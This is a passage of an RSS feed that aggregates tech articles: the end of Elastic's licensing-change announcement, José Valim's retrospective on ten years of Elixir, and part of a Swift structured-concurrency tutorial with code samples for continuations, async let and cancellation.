</p><h2>Why change?</h2><p>As previously mentioned, over the last three years, the market has evolved and the community has come to appreciate that open source companies need to better protect their software in order to maintain a high level of investment and innovation. With the shift to SaaS as a delivery model, some cloud service providers have taken advantage of open source products by providing them as a service, without contributing back. This diverts funds that would have been reinvested into the product and hurts users and the community.
</p><p>Similar to our open source peers, we have lived this experience firsthand, from our trademarks being misused to outright attempts to splinter our community with “open” repackaging of our OSS products or even taking “inspiration” from our proprietary code. While each open source company has taken a slightly different approach to address this issue, they have generally modified their open source license in order to protect their investment in free software, while trying to preserve the principles of openness, transparency, and collaboration. Similarly, we are taking the natural next step of making a targeted change to how we license our source code. This change won't affect the vast majority of our users, but it will restrict cloud service providers from offering our software as a service.
</p><p>We expect that a few of our competitors will attempt to spread all kinds of FUD around this change. Let me be clear to any naysayers. We believe deeply in the principles of free and open products, and of transparency with the community. Our track record speaks to this commitment, and we will continue to build upon it.
</p><h2>The change</h2><p>Starting with the upcoming Elastic 7.11 release, we will be moving the Apache 2.0-licensed code of Elasticsearch and Kibana to be dual licensed under SSPL and the Elastic License, giving users the choice of which license to apply. SSPL is a source-available license created by MongoDB to embody the principles …</p></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.elastic.co/blog/licensing-change">https://www.elastic.co/blog/licensing-change</a></em></p>]]>
            </description>
            <link>https://www.elastic.co/blog/licensing-change</link>
            <guid isPermaLink="false">hacker-news-small-sites-25776657</guid>
            <pubDate>Thu, 14 Jan 2021 14:29:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[10 years-ish of Elixir]]>
            </title>
            <description>
<![CDATA[
Score 417 | Comments 119 (<a href="https://news.ycombinator.com/item?id=25776525">thread link</a>) | @1_player
<br/>
January 14, 2021 | https://dashbit.co/blog/ten-years-ish-of-elixir | <a href="https://web.archive.org/web/*/https://dashbit.co/blog/ten-years-ish-of-elixir">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <article>
    
<ul>
  <li>
    <i></i> José Valim
  </li>
  <li>
    <i></i> January 11th, 2021
  </li>
  <li>
    <i></i><a href="https://dashbit.co/blog/tags/elixir">elixir</a>, <a href="https://dashbit.co/blog/tags/phoenix">phoenix</a>, <a href="https://dashbit.co/blog/tags/broadway">broadway</a>, <a href="https://dashbit.co/blog/tags/nerves">nerves</a>, <a href="https://dashbit.co/blog/tags/liveview">liveview</a>, <a href="https://dashbit.co/blog/tags/membrane">membrane</a>
  </li>
</ul>
<p>
This past weekend, on January 9th, we celebrated 10 years since <a href="https://github.com/elixir-lang/elixir/commit/337c3f2d569a42ebd5fcab6fef18c5e012f9be5b">the first commit to the Elixir repository</a>. While I personally don’t consider <a href="https://elixir-lang.org/">Elixir</a> to be 10 years old yet - the language that became what Elixir is today <a href="https://github.com/elixir-lang/elixir/commit/6052352b6281752b905b30eb5b08fac0f51f68cd">surfaced only 14 months later</a> - a decade is a mark to celebrate!</p>
<p>
The goal of this post is to focus on the current state of some projects in the ecosystem and then briefly highlight a few of the exciting efforts coming over the next months.</p>
<h2>
Recap: The language goals</h2>
<p>
When I started working on Elixir, I personally had the ambition of using it for building scalable and robust web applications. However, I didn’t want Elixir to be tied to the web. My goal was to design an <em>extensible</em> language with a diverse ecosystem. Elixir aims to be a general purpose language and allows developers to extend it to new domains.</p>
<p>
Given Elixir is built on top of Erlang and Erlang is used for networking and distributed systems, Elixir would naturally be a good fit in those domains too, as long as I didn’t screw things up. The Erlang VM is essential to everything we do in Elixir, which is why <em>compatibility</em> has become a language goal too.</p>
<p>
I also wanted the language to be <em>productive</em>, especially by focusing on the tooling. Learning a functional programming language is a new endeavor for most developers. Consequently their first experiences getting started with the language, setting up a new project, searching for documentation, and debugging should go as smoothly as possible.</p>
<p>
Extensibility, compatibility, and productivity are the goals we built the language upon.</p>
<h2>
Recap: Elixir in production</h2>
<p>
Last year we started <a href="https://elixir-lang.org/cases.html">a series of articles on companies using Elixir in production on the official website</a>. As of today, we have 7 production cases listed with more coming this year! Overall it is very exciting to see many different companies using a variety of business models and industries running Elixir in production.</p>
<p>
Companies like <a href="https://www.brex.com/">Brex</a> (<a href="https://elixir-lang.org/blog/2020/06/23/growing-with-elixir-at-brex/">case</a>), <a href="https://discord.com/">Discord</a> (<a href="https://elixir-lang.org/blog/2020/10/08/real-time-communication-at-scale-with-elixir-at-discord/">case</a>), <a href="https://getdivvy.com/">Divvy</a>, <a href="https://www.podium.com/">Podium</a>, and <a href="https://salesloft.com/">SalesLoft</a> have reached <a href="https://en.wikipedia.org/wiki/Unicorn_(finance)">“unicorn status”</a> and rely heavily on Elixir. Startups like <a href="https://www.joinblvd.com/">Boulevard</a> (<a href="https://soundcloud.com/elixirtalk/episode-166-feat-sean-stavropoulos">podcast</a>), <a href="https://community.com/">Community</a>, <a href="https://duffel.com/">Duffel</a> (<a href="https://elixir-lang.org/blog/2020/12/10/integrating-travel-with-elixir-at-duffel/">case</a>), <a href="https://www.ockam.io/">Ockam</a>, <a href="https://www.mux.com/">Mux</a>, <a href="https://ramp.com/">Ramp</a>, <a href="https://remote.com/">Remote</a>, and <a href="https://www.v7labs.com/">V7</a> (<a href="https://elixir-lang.org/blog/2021/01/13/orchestrating-computer-vision-with-elixir/">case</a>) also use Elixir and have received funding in the last year or two. Elixir is also used within known brands and enterprises such as <a href="https://bleacherreport.com/">Bleacher Report</a>, <a href="https://www.change.org/">Change.org</a> (<a href="https://elixir-lang.org/blog/2020/10/27/delivering-social-change-with-elixir-at-change.org/">case</a>), <a href="https://heroku.com/">Heroku</a> (<a href="https://elixir-lang.org/blog/2020/09/24/paas-with-elixir-at-Heroku/">case</a>), <a href="https://www.pagerduty.com/">PagerDuty</a>, <a href="https://www.pepsico.com/">PepsiCo</a>, and <a href="https://www.therealreal.com/">TheRealReal</a>.</p>
<p>
There is also a special category of startups that run Elixir alonside an open source model, such as <a href="https://plausible.io/">Plausible Analytics</a>, <a href="https://app.supabase.io/">Supabase</a>, <a href="https://logflare.app/">Logflare</a> (<a href="https://runninginproduction.com/podcast/11-logflare-is-a-log-management-and-event-analytics-platform">podcast</a>), and <a href="https://hex.pm/">Hex.pm</a> (<a href="https://runninginproduction.com/podcast/19-hexpm-is-elixirs-official-package-manager">podcast</a>) itself. Still on the open source front, you will find projects like <a href="https://pleroma.social/">Pleroma</a> and <a href="https://changelog.com/">Changelog</a>. There also many small scale and hobby projects that use Elixir for a productive and joyful development experience.</p>
<h2>
Recap: Diverse ecosystem</h2>
<p>
Today, Elixir has a diverse ecosystem that works on a wide range of domains and industries. Let’s take a look at some examples.</p>
<h3>
Web</h3>
<p>
Most developers are familiar with using Elixir for web development thanks to <a href="https://phoenixframework.org/">the Phoenix web framework</a>. Phoenix gained traction in the ecosystem because it was the first to fully leverage the language and the platform for building real-time applications besides the usual MVC (Model-View-Controller) offering.</p>
<p>
It all started with Phoenix Channels, as a bi-directional communication between clients and servers, and Phoenix PubSub, which uses Erlang’s distributed compatibilities to broadcast messages across nodes. As far as I know, Phoenix was the first major web framework to provide a multi-node web real-time solution completely out-of-the-box. Regardless if you are using one node or ten nodes, everything just works, with minimal configuration and dependencies.</p>
<p>
Phoenix has matured a lot since its first stable release. Phoenix v1.2 included <a href="https://hexdocs.pm/phoenix/Phoenix.Presence.html">Phoenix Presence</a>, that allows developers to track which users, IoT devices, etc are connected to your cluster right now. No databases or external dependencies required! This is one of the problems that look deceptively simple at first, but once you outline all scalability, performance, and fault-tolerance requirements, it <a href="https://elixir-lang.org/blog/2020/11/17/real-time-collaboration-with-elixir-at-slab/">becomes quite complex</a>. Luckily, Phoenix is running on a platform that excels at these problems, and I am not aware of any other framework that provides such a lean and elegant solution as part of its default stack.</p>
<p>
Most recently, <a href="https://github.com/phoenixframework/phoenix_live_view">Phoenix LiveView</a> was released and brought new ways to build rich, real-time user experiences with server-rendered HTML, inspiring developers to attempt similar solutions for other languages and frameworks. You can read the <a href="https://dockyard.com/blog/2018/12/12/phoenix-liveview-interactive-real-time-apps-no-need-to-write-javascript">original announcement</a> or <a href="https://www.phoenixframework.org/blog/build-a-real-time-twitter-clone-in-15-minutes-with-live-view-and-phoenix-1-5">learn how to build a real-time Twitter clone in 15 minutes</a>. As part of the <em>Live</em> family, we have also announced <a href="https://twitter.com/josevalim/status/1250846714665357315">Phoenix LiveDashboard</a>, making monitoring and instrumentation a first-class citizen for Phoenix applications.</p>
<h3>
Embedded and IoT</h3>
<p>
While I always expected Elixir to shine for building web applications, I was taken by surprise when I heard about the <a href="https://www.nerves-project.org/">Nerves platform</a> for creating high-end embedded applications. However, once I learned their premise, it all made sense: writing embedded systems <em>is</em> complicated. Reasoning about failures is hard. So what if we could leverage the decades of lessons learnt by Erlang/OTP to design embedded applications? What if a fault on the Wi-Fi driver could be fixed by having a supervisor simply restart it? After all, the first major use of Erlang/OTP was in an embedded system, the Ericsson AXD301 ATM switch.</p>
<p>
Nerves brings the Elixir ecosystem and the battle-tested Erlang VM to edge computing, providing a rich developer experience using proven technology. Nerves started as a one step process for turning an Elixir project into a complete software image for common hardware devices. Today, Nerves is being used in production in industrial automation, machine learning, consumer electronics and more, with <a href="https://farm.bot/">Farmbot</a> (<a href="https://elixir-lang.org/blog/2020/08/20/embedded-elixir-at-farmbot/">case</a>) and <a href="https://www.rosepoint.com/">Rose Point Navigation</a> being two of the most notable examples.</p>
<p>
The Nerves team also created <a href="https://www.nerves-hub.org/">NervesHub</a>, a fully open-source device management system. Combining all these technologies makes Elixir a comprehensive language for building end-to-end IoT platforms.</p>
<h3>
Data ingestion and pipelines</h3>
<p>
Shortly after Elixir v1.0 was released, the Elixir Core Team and I started looking into abstractions for tackling data ingestions and data pipelines in Elixir. We ran through a couple designs until we eventually <a href="https://elixir-lang.org/blog/2016/07/14/announcing-genstage/">landed on GenStage</a>: a behaviour for exchanging data with back-pressure between Elixir processes and external systems. For an introduction, make sure to check out <a href="https://youtu.be/srtMWzyqdp8?t=242">my keynote introducing both GenStage and Flow</a>.</p>
<p>
Today, almost 5 years later, GenStage has been used by many industries and has become one of the factors driving Elixir adoption. For example, you can read how both <a href="https://elixir-lang.org/blog/2020/10/08/real-time-communication-at-scale-with-elixir-at-discord/">Discord</a> and <a href="https://elixir-lang.org/blog/2020/10/27/delivering-social-change-with-elixir-at-change.org/">Change.org</a> have built systems on Elixir and GenStage that handle spikes and run at massive scale.</p>
<p>
However, GenStage was just the beginning. In 2019, <a href="https://www.youtube.com/watch?v=ZOExnT1PYjs">we announced Broadway</a>, which is a higher-level abstraction on top of GenStage that makes building data ingestion pipelines a breeze. We originally released with Amazon SQS support. Nowadays, RabbitMQ, Google Cloud PubSub, Apache Kafka, and other sources (known as producers in Broadway terms) are also available.</p>
<h3>
Audio/Video streaming</h3>
<p>
Since the Erlang VM was designed for scalable network processing, one can expect to also be an excellent platform for audio and video streaming. However, if you also wanted to process and transform those streams on the fly, the situation becomes much more complicated as you likely have to integrate with native code.</p>
<p>
Luckily, the tables have turned when Erlang/OTP 20 was released a couple years ago with the so-called Dirty NIFs. The Erlang VM always had the ability to invoke native code, but this native code could not run for long, as to not interfere with the preemptive features of the Erlang runtime. Dirty NIFs allow developers to tag native code either as IO or CPU bound, which runs on specific threads. Between ports (I/O based), NIFs, Dirty NIFs, and remote nodes, developers now have many options to interface with native code with different performance and reliability guarantees. That’s exactly the foundation the <a href="http://www.membraneframework.org/">Membrane Framework</a> builds on top of.</p>
<p>
Membrane was extracted from RadioKit, a startup aiming at disrupting the radio broadcasting industry. Originally it focused on processing and mixing audio. Later, <a href="https://www.swmansion.com/">Software Mansion</a> acquired the framework and provided stable funding and a solid team to help it grow into a full-scale framework. Currently, it allows developers to process, transmit, broadcast, and transform audio and videos streams on the fly. Whether you are building a Twitch clone, a VOD application or a video conferencing system, Membrane provides a growing set of high-level abstractions and pre-made modules so you don’t have to dive into idiosyncrasies of particular codecs, protocols, and formats. </p>
<h2>
Looking ahead: what is coming in 2021</h2>
<p>
The year of 2021 looks very exciting for the Erlang Ecosystem and the Elixir community. In this section, we are going to mention some of the things we expect to see in 2021.</p>
<h3>
Erlang/OTP 24 with JIT</h3>
<p>
In September 2020, <a href="https://github.com/erlang/otp/pull/2745">Lukas Larsson and the Erlang/OTP team</a> announced a JIT compiler for the Erlang VM called BeamAsm. How faster the JIT will be in practice depends on your application but the results posted in the announcement are promising. To quote Lukas:</p>
<blockquote>
  <p>
If we run the JSON benchmarks found in the <a href="https://github.com/devinus/poison/tree/master/bench">Poison</a> or <a href="https://github.com/michalmuskala/jason/tree/master/bench">Jason</a>, BeamAsm achieves anything from 30% to 130% increase (average at about 70%) in the number of iterations per second for all Erlang/Elixir implementations. For some benchmarks, BeamAsm is even faster than the pure C implementation <a href="https://github.com/davisp/jiffy">jiffy</a>.  </p>
</blockquote>
<blockquote>
  <p>
More complex applications tend to see a more moderate performance increase, for instance, RabbitMQ is able to handle 30% to 50% more messages per second depending on the scenario.  </p>
</blockquote>
<p>
I have been running …</p></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://dashbit.co/blog/ten-years-ish-of-elixir">https://dashbit.co/blog/ten-years-ish-of-elixir</a></em></p>]]>
            </description>
            <link>https://dashbit.co/blog/ten-years-ish-of-elixir</link>
            <guid isPermaLink="false">hacker-news-small-sites-25776525</guid>
            <pubDate>Thu, 14 Jan 2021 14:21:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Structured concurrency in Swift: continuations, tasks, and cancellation]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25776245">thread link</a>) | @maxdesiatov
<br/>
January 14, 2021 | https://desiatov.com/swift-structured-concurrency-introduction | <a href="https://web.archive.org/web/*/https://desiatov.com/swift-structured-concurrency-introduction">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-reactid="52"><p>This article is a part of my series about concurrency and asynchronous
programming in Swift. The articles are independent, but after reading this one
you might want to check out the rest of the series:</p>
<ul>
<li><em><strong><a href="https://desiatov.com/closures#title">How do closures and callbacks work? It’s turtles all the way
down</a></strong></em></li>
<li><em><strong><a href="https://desiatov.com/event-loops#title">Event loops, building smooth UIs, and handling high server load</a></strong></em></li>
<li><em><strong><a href="https://desiatov.com/swift-generators#title">What are generators and why Swift needs them?</a></strong></em></li>
<li><em><strong><a href="https://desiatov.com/swift-coroutines#title">Coroutines and “yield” expressions in Swift</a></strong></em></li>
<li><em><strong>Introduction to structured concurrency in Swift: continuations, tasks, and cancellation</strong></em></li>
</ul>
<hr>
<p><strong>IMPORTANT:</strong> This article is about an experimental feature, which is not available in a stable
version of Swift as of January 2021. APIs and behaviors described in this article may change without notice as new
development snapshots become available, but I will try to keep sample code updated as we get closer
to general availability of <a href="https://github.com/DougGregor/swift-evolution/blob/structured-concurrency/proposals/nnnn-structured-concurrency.md">structured concurrency</a> in Swift.</p>
<hr>
<p>There are many discussions of the imminent introduction of <code>async</code>/<code>await</code> to Swift. The authors of
Swift concurrency proposals have done monumental work in preparing all of the related features. And
there are many of them. Just have a look at the actual “dependency tree” of the proposals:</p>
<p>
  <a href="https://desiatov.com/static/SwiftConcurrencyDependencies-dd58811a6b3b7d7f21b03f64b5dea026-a2a6f.png" target="_blank" rel="noopener">
  
  <span>
    <span>
      <img alt="The dependency tree of 10 separate concurrency proposals in Swift with async/await as the root" title="" src="https://desiatov.com/static/SwiftConcurrencyDependencies-dd58811a6b3b7d7f21b03f64b5dea026-fb8a0.png" srcset="https://desiatov.com/static/SwiftConcurrencyDependencies-dd58811a6b3b7d7f21b03f64b5dea026-1a291.png 148w,
https://desiatov.com/static/SwiftConcurrencyDependencies-dd58811a6b3b7d7f21b03f64b5dea026-2bc4a.png 295w,
https://desiatov.com/static/SwiftConcurrencyDependencies-dd58811a6b3b7d7f21b03f64b5dea026-fb8a0.png 590w,
https://desiatov.com/static/SwiftConcurrencyDependencies-dd58811a6b3b7d7f21b03f64b5dea026-a2a6f.png 872w" sizes="(max-width: 590px) 100vw, 590px">
    </span>
  </span>
  
  </a>
    </p>

<p>Around the time <code>async</code>/<code>await</code> proposal was accepted, I saw people asking almost the same set of
questions: how to convert legacy APIs to async? How an entrypoint to <code>async</code> code would look like? While
examples of usage of <code>async</code>/<code>await</code> in UIKit apps were shared around, there were no good
examples that utilized the structured concurrency proposal. I wanted to have a look at some minimal
isolated code snippets that could help me answer these questions.</p>
<h2>Setting up a SwiftPM project</h2>
<p>Turns out, it’s relatively easy to set up a CLI project with SwiftPM that uses <code>async</code>/<code>await</code>.
Please feel free to <a href="https://github.com/MaxDesiatov/SwiftConcurrencyExample">clone the final result from GitHub</a>
to follow along. The <code>README.md</code> file in the repository also contains important installation steps, as the
standard toolchain supplied in the latest stable Xcode currently won’t work. You’ll have to install
a development toolchain as described in the document to run this example code on your own machine.
In the rest of the article I’m going to review this example project piece by piece.</p>
<h3>Compiler flags</h3>
<p>Notice how the target needs to be declared in <code>Package.swift</code>:</p>

    <div data-language="swift">
      <pre><code><span>.target</span><span>(</span><span>
</span><span>    </span><span>name</span><span>:</span><span> </span><span>"ConcurrencyExample"</span><span>,</span><span>
</span><span>    </span><span>dependencies</span><span>:</span><span> </span><span>[],</span><span>
</span><span>    </span><span>swiftSettings</span><span>:</span><span> </span><span>[</span><span>
</span><span>        </span><span>.unsafeFlags</span><span>([</span><span>"-Xfrontend"</span><span>,</span><span> </span><span>"-enable-experimental-concurrency"</span><span>]),</span><span>
</span><span>    </span><span>]</span><span>
</span><span>)</span></code></pre>
    </div>
<p>Until Swift concurrency features become stable and enabled by default you have to pass these flags
when building. They are declared in the package manifest here so that you don’t have to pass them
each time manually when building the project.</p>
<h3>Imports</h3>
<p>When using <a href="https://forums.swift.org/t/pitch-2-structured-concurrency/43452">structured concurrency</a>
to expose legacy callback-based APIs as <code>async</code> functions, you currently have to import the
<code>_Concurrency</code> module supplied with the latest Swift dev snapshots. The name of it starts with an
underscore to highlight that the module is experimental and its API may change.</p>
<h2>Reviewing the code</h2>
<h3>Continuations</h3>
<p>While most of Apple’s APIs will be converted to <code>async</code>/<code>await</code>
<a href="https://github.com/apple/swift-evolution/blob/main/proposals/0297-concurrency-objc.md">automatically</a>,
your own callback-based code can be converted using a few helper functions, such as
<code>withUnsafeContinuation</code> and <code>withUnsafeThrowingContinuation</code>. They take a closure with a single
<em>continuation</em> argument, and you’re supposed to call your callback-based code from this closure,
capture the continuation, and call <code>resume</code> on it when you’re finished. Here’s how the declarations look for
the non-throwing variant for more context:</p>

    <div data-language="swift">
      <pre><code><span>struct</span><span> </span><span>UnsafeContinuation</span><span>&lt;</span><span>T</span><span>&gt;</span><span> </span><span>{</span><span>
</span><span>  </span><span>func</span><span> </span><span>resume</span><span>(</span><span>returning</span><span>:</span><span> </span><span>T</span><span>)</span><span>
</span><span>}</span><span>

</span><span>func</span><span> </span><span>withUnsafeContinuation</span><span>&lt;</span><span>T</span><span>&gt;</span><span>(</span><span>
</span><span>    </span><span>operation</span><span>:</span><span> </span><span>(</span><span>UnsafeContinuation</span><span>&lt;</span><span>T</span><span>&gt;</span><span>)</span><span> </span><span>-&gt;</span><span> </span><span>()</span><span>
</span><span>)</span><span> </span><span>async</span><span> </span><span>-&gt;</span><span> </span><span>T</span></code></pre>
    </div>
<p>One of the most simple but practical enough example of a non-throwing async call is <code>sleep</code>:</p>

    <div data-language="swift">
      <pre><code><span>import</span><span> </span><span>_Concurrency</span><span>
</span><span>import</span><span> </span><span>Dispatch</span><span>

</span><span>func</span><span> </span><span>sleep</span><span>(</span><span>seconds</span><span>:</span><span> </span><span>Int</span><span>)</span><span> </span><span>async</span><span> </span><span>{</span><span>
</span><span>    </span><span>await</span><span> </span><span>withUnsafeContinuation</span><span> </span><span>{</span><span> </span><span>c</span><span> </span><span>in</span><span>
</span><span>        </span><span>DispatchQueue</span><span>.global</span><span>()</span><span>
</span><span>            </span><span>.asyncAfter</span><span>(</span><span>deadline</span><span>:</span><span> </span><span>.now</span><span>()</span><span> </span><span>+</span><span> </span><span>.seconds</span><span>(</span><span>seconds</span><span>))</span><span> </span><span>{</span><span>
</span><span>                </span><span>c</span><span>.resume</span><span>(</span><span>returning</span><span>:</span><span> </span><span>())</span><span>
</span><span>            </span><span>}</span><span>
</span><span>    </span><span>}</span><span>
</span><span>}</span></code></pre>
    </div>
<p>And here’s a throwing variant:</p>

    <div data-language="swift">
      <pre><code><span>struct</span><span> </span><span>UnsafeThrowingContinuation</span><span>&lt;</span><span>T</span><span>,</span><span> </span><span>E</span><span>:</span><span> </span><span>Error</span><span>&gt;</span><span> </span><span>{</span><span>
</span><span>  </span><span>func</span><span> </span><span>resume</span><span>(</span><span>returning</span><span>:</span><span> </span><span>T</span><span>)</span><span>
</span><span>  </span><span>func</span><span> </span><span>resume</span><span>(</span><span>throwing</span><span>:</span><span> </span><span>E</span><span>)</span><span>
</span><span>}</span><span>

</span><span>func</span><span> </span><span>withUnsafeThrowingContinuation</span><span>&lt;</span><span>T</span><span>&gt;</span><span>(</span><span>
</span><span>    </span><span>operation</span><span>:</span><span> </span><span>(</span><span>UnsafeThrowingContinuation</span><span>&lt;</span><span>T</span><span>,</span><span> </span><span>Error</span><span>&gt;</span><span>)</span><span> </span><span>-&gt;</span><span> </span><span>()</span><span>
</span><span>)</span><span> </span><span>async</span><span> </span><span>throws</span><span> </span><span>-&gt;</span><span> </span><span>T</span></code></pre>
    </div>
<p>Based on that we can convert <code>URLSession.dataTask</code> to a throwing <code>async</code> function:</p>

    <div data-language="swift">
      <pre><code><span>import</span><span> </span><span>Foundation</span><span>

</span><span>struct</span><span> </span><span>UnknownError</span><span>:</span><span> </span><span>Error</span><span> </span><span>{}</span><span>

</span><span>func</span><span> </span><span>download</span><span>(</span><span>_</span><span> </span><span>url</span><span>:</span><span> </span><span>String</span><span>)</span><span> </span><span>async</span><span> </span><span>throws</span><span> </span><span>-&gt;</span><span> </span><span>Data</span><span> </span><span>{</span><span>
</span><span>    </span><span>print</span><span>(</span><span>"fetching \(</span><span>url</span><span>)"</span><span>)</span><span>
</span><span>    </span><span>return</span><span> </span><span>try</span><span> </span><span>await</span><span> </span><span>withUnsafeThrowingContinuation</span><span> </span><span>{</span><span> </span><span>c</span><span> </span><span>in</span><span>
</span><span>        </span><span>let</span><span> </span><span>task</span><span> </span><span>=</span><span> </span><span>URLSession</span><span>.shared.dataTask</span><span>(</span><span>with</span><span>:</span><span> </span><span>URL</span><span>(</span><span>string</span><span>:</span><span> </span><span>url</span><span>)</span><span>!</span><span>)</span><span> </span><span>{</span><span> </span><span>data</span><span>,</span><span> </span><span>_</span><span>,</span><span> </span><span>error</span><span> </span><span>in</span><span>
</span><span>            </span><span>switch</span><span> </span><span>(</span><span>data</span><span>,</span><span> </span><span>error</span><span>)</span><span> </span><span>{</span><span>
</span><span>            </span><span>case</span><span> </span><span>let</span><span> </span><span>(</span><span>_</span><span>,</span><span> </span><span>error</span><span>?</span><span>):</span><span>
</span><span>                </span><span>return</span><span> </span><span>c</span><span>.resume</span><span>(</span><span>throwing</span><span>:</span><span> </span><span>error</span><span>)</span><span>
</span><span>            </span><span>case</span><span> </span><span>let</span><span> </span><span>(</span><span>data</span><span>?</span><span>,</span><span> </span><span>_</span><span>):</span><span>
</span><span>                </span><span>return</span><span> </span><span>c</span><span>.resume</span><span>(</span><span>returning</span><span>:</span><span> </span><span>data</span><span>)</span><span>
</span><span>            </span><span>case</span><span> </span><span>(</span><span>nil</span><span>,</span><span> </span><span>nil</span><span>):</span><span>
</span><span>                </span><span>c</span><span>.resume</span><span>(</span><span>throwing</span><span>:</span><span> </span><span>UnknownError</span><span>())</span><span>
</span><span>            </span><span>}</span><span>
</span><span>        </span><span>}</span><span>
</span><span>        </span><span>task</span><span>.resume</span><span>()</span><span>
</span><span>    </span><span>}</span><span>
</span><span>}</span></code></pre>
    </div>
<p>Here the continuation <code>c</code> argument of the closure passed to <code>withUnsafeThrowingContinuation</code> becomes
your “callback”. You have to call <code>resume</code> on it exactly once with either a success value or an
<code>Error</code> value. Multiple calls to <code>resume</code> on the same continuation are invalid, since
<code>async</code> functions can’t throw or return more than once. If you don’t ever call <code>resume</code> on the
continuation you’ll get a function that never returns or throws, which is just as wrong as throwing
or returning more than once.</p>
<h3>The entry point</h3>
<p>As you probably noticed, in previous examples we got <code>async</code> functions, but how do you actually call them from
non-<code>async</code> code? Currently, the <code>runAsyncAndBlock</code> function is an entry point you would use to
interact with an <code>async</code> function from your blocking synchronous code:</p>

    <div data-language="swift">
      <pre><code><span>runAsyncAndBlock</span><span> </span><span>{</span><span>
</span><span>    </span><span>print</span><span>(</span><span>"task started"</span><span>)</span><span>
</span><span>    </span><span>let</span><span> </span><span>data</span><span> </span><span>=</span><span> </span><span>try</span><span>!</span><span> </span><span>await</span><span> </span><span>download</span><span>(</span><span>"https://httpbin.org/uuid"</span><span>)</span><span>
</span><span>    </span><span>print</span><span>(</span><span>String</span><span>(</span><span>data</span><span>:</span><span> </span><span>data</span><span>,</span><span> </span><span>encoding</span><span>:</span><span> </span><span>.utf8</span><span>)</span><span>!</span><span>)</span><span>
</span><span>}</span><span>
</span><span>print</span><span>(</span><span>"end of main"</span><span>)</span></code></pre>
    </div>
<p>Note that in the current toolchain (<code>DEVELOPMENT-SNAPSHOT-2021-01-12-a</code> at the moment of writing)
<code>runAsyncAndBlock</code> does not take throwing closures as arguments, thus <code>try!</code> or <code>do</code>/<code>catch</code> blocks
are required to call a throwing <code>async</code> function such as <code>download</code>.</p>
<p>The <code>print</code> statements here are added so that you can observe the execution sequence and to make sure
that your <code>async</code> code is actually called.</p>
<p>Remember that you should not use <code>runAsyncAndBlock</code> in your GUI code running on the
main thread, as it will block the event loop from processing any input from your user. This will
result in your app being frozen until the <code>async</code> closure body has finished. In a CLI app that
doesn’t expect any input this is fine though. In GUI apps you’d either have to call <code>runAsyncAndBlock</code>
on a background thread that can be blocked, or use async handlers or actors to host your async code.
Given that proposals for async handlers and actors aren’t available yet, we’re leaving those
advanced topics out, and focus on a simple command-line app here.</p>
<h3>Launching concurrent tasks with “async let”</h3>
<p>Let’s say you need to fetch UUIDs for multiple entities, but you can only get a single one through
an asynchronous call. In some naive implementation you would <code>await</code> for async calls repeatedly
one by one until you fetch all of the data. This is highly inefficient if these calls are independent
and can all run simultaneously without disrupting each other.</p>
<p>You can launch multiple async tasks concurrently with <code>async let</code> declarations. Then if you need to
wait for all of them to complete, just use a single <code>await</code> marker on both of the values that
were declared with <code>async let</code>:</p>

    <div data-language="swift">
      <pre><code><span>func</span><span> </span><span>childTasks</span><span>()</span><span> </span><span>async</span><span> </span><span>throws</span><span> </span><span>-&gt;</span><span> </span><span>String</span><span> </span><span>{</span><span>
</span><span>    </span><span>print</span><span>(</span><span>"\(</span><span>#function</span><span>) started"</span><span>)</span><span>

</span><span>    </span><span>async</span><span> </span><span>let</span><span> </span><span>uuid1</span><span> </span><span>=</span><span> </span><span>download</span><span>(</span><span>"https://httpbin.org/uuid"</span><span>)</span><span>
</span><span>    </span><span>async</span><span> </span><span>let</span><span> </span><span>uuid2</span><span> </span><span>=</span><span> </span><span>download</span><span>(</span><span>"https://httpbin.org/uuid"</span><span>)</span><span>

</span><span>    </span><span>return</span><span> </span><span>try</span><span> </span><span>await</span><span> </span><span>"""</span><span>
</span><span>    ids fetched conncurrently:</span><span>
</span><span>    uuid1: \(</span><span>String</span><span>(</span><span>data</span><span>:</span><span> </span><span>uuid1</span><span>,</span><span> </span><span>encoding</span><span>:</span><span> </span><span>.utf8</span><span>)</span><span>!</span><span>)</span><span>
</span><span>    uuid2: \(</span><span>String</span><span>(</span><span>data</span><span>:</span><span> </span><span>uuid2</span><span>,</span><span> </span><span>encoding</span><span>:</span><span> </span><span>.utf8</span><span>)</span><span>!</span><span>)</span><span>
</span><span>    """</span><span>
</span><span>}</span></code></pre>
    </div>
<p>Here two separate <code>uuid1</code> and <code>uuid2</code> tasks are launched concurrently, and they don’t block each
other. The <code>try! await</code> markers before <code>print</code> mean that <code>print</code> won’t evaluate before both of the
tasks have completed. Compare this with the old
<a href="https://developer.apple.com/documentation/dispatch"><code>Dispatch</code></a> approach, where instead of <code>async let</code> you’d have to set up a
<a href="https://developer.apple.com/documentation/dispatch/dispatchgroup"><code>DispatchGroup</code></a> instance, which
is much more cumbersome to work with.</p>
<h3>Cancellation</h3>
<p>Tasks launched with <code>async let</code> are called <em>“child tasks”</em>, and this is important when you think
about cancellation. <code>async let</code> forms an implicit task hierarchy which reflects call stacks of async
functions. In the code above <code>await childTasks()</code> launches one parent task, which then spawns two
more child tasks for <code>download</code> calls. When a parent task is cancelled, its child tasks are
cancelled too.</p>
<p>The most critical thing to highlight is that cancellation with Swift’s structured concurrency is
cooperative, i.e. tasks need to “cooperate” in an explicit way to get cancelled as early as
possible. This is done with <code>checkCancellation()</code> and
<code>isCancelled()</code> static functions declared on the <code>Task</code> type from the <code>_Concurrency</code> module:</p>

    <div data-language="swift">
      <pre><code><span>extension</span><span> </span><span>Task</span><span> </span><span>{</span><span>
</span><span>  </span><span>
</span><span>  </span><span>
</span><span>  </span><span>
</span><span>  </span><span>static</span><span> </span><span>func</span><span> </span><span>isCancelled</span><span>()</span><span> </span><span>async</span><span> </span><span>-&gt;</span><span> </span><span>Bool</span><span>

</span><span>  </span><span>
</span><span>  </span><span>
</span><span>  </span><span>
</span><span>  </span><span>
</span><span>  </span><span>struct</span><span> </span><span>CancellationError</span><span>:</span><span> </span><span>Error</span><span> </span><span>{</span><span>
</span><span>    </span><span>
</span><span>    </span><span>init</span><span>()</span><span> </span><span>{}</span><span>
</span><span>  </span><span>}</span><span>

